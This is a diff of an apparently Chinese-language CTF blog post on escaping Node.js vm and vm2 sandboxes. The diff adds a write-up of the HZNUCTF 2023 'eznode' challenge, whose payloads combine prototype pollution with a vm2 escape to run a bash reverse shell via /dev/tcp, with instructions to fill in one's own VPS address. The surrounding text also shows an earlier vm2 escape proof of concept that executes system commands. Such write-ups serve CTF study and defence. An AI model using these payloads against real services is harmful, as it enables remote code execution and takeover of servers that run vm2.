@@ -15,7 +15,7 @@
 <meta property="og:description" content="Study and research of sandbox escape">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-09-01T10:15:10.000Z">
-<meta property="article:modified_time" content="2023-09-01T10:16:44.371Z">
+<meta property="article:modified_time" content="2023-09-01T11:13:47.948Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -101,7 +101,7 @@
       <div class="toc-parent">
   <div id="toc" class="toc-article">
     <div class="toc-title">目录</div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">VM沙箱逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">VM2沙箱逃逸</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#VM%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">VM沙箱逃逸</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#VM2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">VM2沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-HZNUCTF-2023-final-eznode"><span class="toc-text">例题-[HZNUCTF 2023 final]eznode</span></a></li></ol></li></ol></li></ol>
   </div>
 </div>
       <p><strong>Study and research of sandbox escape</strong></p>
@@ -157,11 +157,34 @@
 </blockquote>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//绕过代码</span></span><br><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="comment">//启用严格模式，从vm2库中引入VM类</span></span><br><span class="line"><span class="keyword">const</span> &#123;<span class="variable constant_">VM</span>&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="comment">//屏蔽原有的process对象</span></span><br><span class="line"><span class="comment">// Object.defineProperty() 是用于在对象上定义一个新属性，或修改已有的属性。</span></span><br><span class="line"><span class="comment">// 语法：Object.defineProperty(obj, prop, descriptor)</span></span><br><span class="line"><span class="comment">// 其中，obj 是需要定义属性的对象，</span></span><br><span class="line"><span class="comment">//		prop 是需要定义或修改的属性名，</span></span><br><span class="line"><span class="comment">//		descriptor 是一个 JavaScript 对象</span></span><br><span class="line"><span class="comment">//在Buffer.from(&quot;&quot;)对象上定义一个空字符串属性</span></span><br><span class="line"><span class="comment">//在Object.prototype上定义一个名为get的属性</span></span><br><span class="line"><span class="comment">//当访问这个get属性时，它会抛出一个异常，异常是一个函数，该函数能够返回process对象</span></span><br><span class="line"><span class="comment">//在异常处理中，代码通过e(() =&gt; &#123;&#125;)的形式来调用被篡改的Object.prototype.get方法，尝试获取到process对象。</span></span><br><span class="line"><span class="comment">//在这个过程中，篡改的Object.prototype.get方法会被调用，抛出一个返回process的函数，从而获取到process对象</span></span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">    Object.defineProperty(Buffer.from(&quot;&quot;), &quot;&quot;, &#123;get set()&#123;</span></span><br><span class="line"><span class="string">        Object.defineProperty(Object.prototype,&quot;get&quot;,&#123;get()&#123;</span></span><br><span class="line"><span class="string">            throw x=&gt;x.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">        &#125;&#125;);</span></span><br><span class="line"><span class="string">        return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">    &#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">    process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
+<h3 id="例题-HZNUCTF-2023-final-eznode"><a href="#例题-HZNUCTF-2023-final-eznode" class="headerlink" title="例题-[HZNUCTF 2023 final]eznode"></a>例题-[HZNUCTF 2023 final]eznode</h3><p>用工具扫描，找到源码在app.py中，以下分析关键代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//需要使用原型链污染来污染空对象的shellcode从而实现RCE</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="comment">//copy.body的shit属性为True时才会调用backdoor()</span></span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>存在Nodejs原型链污染和VM2沙箱逃逸</p>
+<p>最后生成的payload如下，把ip和port改成自己的vps弹shell即可</p>
+<ul>
+<li><p>let res = import(‘./app.js’);会返回一个Promise对象</p>
+</li>
+<li><p>任何对象的 <code>toString</code> 方法都是从 <code>Function</code> 对象继承而来的。</p>
+</li>
+<li><p><code>Function</code> 对象的 <code>constructor</code> 属性引用了 <code>Function</code> 构造函数本身</p>
+</li>
+<li><p>res.toString.constructor(“return this”)()返回了全局上下文global，从而获得了全局上下文的引用，可以进一步访问process</p>
+</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\&quot;return this\&quot;) ().process.mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;).toString();&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="comment">//也可以使用下面这个</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;shit&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;shellcode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;let res = import(&#x27;./app.js&#x27;); res.toString.constructor(\&quot;return process\&quot;) ().mainModule.require(\&quot;child_process\&quot;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#x27;).toString();&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/09/01/Sandbox%20Escape/" data-id="clm0fycbs0031883zep4o4ves" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/09/01/Sandbox%20Escape/" data-id="clm0i1rx5004bxw3z4qkt62kx" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
@@ -171,6 +194,15 @@
   
   
 <nav id="article-nav">
+  
+    <a href="/2023/09/01/Nodejs%20Basic%20and%20Vulnerability/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Nodejs Basic and Vulnerability
+        
+      </div>
+    </a>
   
   
     <a href="/2023/09/01/CTF%E2%80%94%E2%80%94Web%E3%80%90%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%E3%80%91/" id="article-nav-older" class="article-nav-link-wrap">
@@ -210,7 +242,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">February 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">December 2022</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">November 2022</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -221,6 +253,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/09/01/Nodejs%20Basic%20and%20Vulnerability/">Nodejs Basic and Vulnerability</a>
+          </li>
         
           <li>
             <a href="/2023/09/01/Sandbox%20Escape/">Sandbox Escape</a>
@@ -236,10 +272,6 @@
         
           <li>
             <a href="/2023/08/30/%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">主从复制与逻辑漏洞</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/29/AWD%20Basic/">AWD Basic</a>
           </li>
         
       </ul>
